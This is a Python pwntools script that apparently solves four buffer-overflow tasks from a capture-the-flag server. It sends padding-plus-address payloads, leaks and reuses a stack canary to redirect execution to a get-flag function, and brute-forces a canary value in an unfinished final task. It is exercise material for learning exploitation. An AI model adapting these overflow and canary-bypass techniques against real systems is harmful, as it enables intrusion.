import time

from pwn import *

url = 'ctf21.softwaresecurity.no'

def task00(port: int):
    conn = remote(url, port)
    first_send = conn.recv(1024)
    print(first_send)
    line = b'a' * 16 + b'\x8b\xef\xbe\x79'
    conn.sendline(line)
    print(conn.recvline())
    print(conn.recvline())
    conn.close()

def task01(port: int):
    conn = remote(url, port)
    print(conn.recvline())
    send = b'a' * 16 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'
    conn.sendline(send)
    print(conn.recvall())
    conn.close()

def task02(port: int):
    conn = remote(url, port)
    print(conn.recvline())
    send = b'16'
    conn.sendline(send)

    # print(f"Send #1 {send}")
    fetc = conn.recvline()
    bfore = b'\x00' * 24
    print(f"The canari is: {int(fetc)}")
    canari = p64(int(fetc))
    after = b'\x00' * 8  # p64(0x0)
    get_flag = p64(0x4007f7)
    # print(f"#2 {bfore, canari, after, get_flag}")
    conn.sendline(bfore + canari + after + get_flag)
    # conn.send()
    print(conn.recvline())
    print(conn.recvline())
    print(conn.recvline())
    conn.close()

def task03(port: int):
    conn = remote(url, port)
    print(conn.recvline())
    #print(conn.recvline())
    first = b'1' * 32
    pt0 = b'a' * 8
    canari_addr = p64(0x7fffffffe098)
    # dfe8
    # dd08
    second = p64(0x4010f0)
    getFlag = p64(0x4011d6)

    canari_Val = "0x7fffffff"  # e098"
    while(True):
        # todo
        current_try = ""
        numb = "012345678abcdef"
        second = "def012"
        hex_field = "123456789abcdef"
        for x in second:
            for y in second:
                for z in hex_field:
                    current_try = x+y+z
                    print(current_try)
                    canary_try = canari_Val+current_try+'8'
                    print(f"Canari try {canary_try}")
                    #print(f"payload is then {first+str.encode(canary_try)}")

                    print(p64(0x01)+p64(int(canary_try, 16), endian='big'))
                    conn.send(p64(0x01)+p64(int(canary_try, 16), endian='big'))
                    time.sleep(0.3)

                    if conn.can_recv():
                        print("***************")
                        print(f"CurrentTry was {canary_try}")
                        print(conn.recvall())
                        print('***************')

                        break
    # what = p64(0x8949ed31fa1e0ff3)


if __name__ == '__main__':
    #task00(7000)
    #task01(7001)
    #task02(7002)
    task03(7003)